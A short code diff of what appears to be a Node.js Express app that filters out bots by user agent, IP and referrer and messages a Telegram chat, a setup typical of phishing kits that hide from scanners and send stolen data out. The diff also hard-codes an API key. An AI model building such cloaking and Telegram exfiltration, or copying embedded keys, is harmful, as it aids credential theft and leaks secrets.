@@ -7,17 +7,14 @@ const axios = require('axios');
 const { sendMessageFor } = require('simple-telegram-message');
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
+const { botUAList } = require('./config/botUA.js');
+const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
+const { botRefList } = require('./config/botRef.js');
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 
 const {
   botToken,
-  chatId,
-  ApiKey,
-  botUAList,
-  botIPList,
-  botIPRangeList,
-  botIPCIDRRangeList,
-  botIPWildcardRangeList,
-  botRefList
+  chatId
 } = require('./config/settings.js');
 
 const app = express();
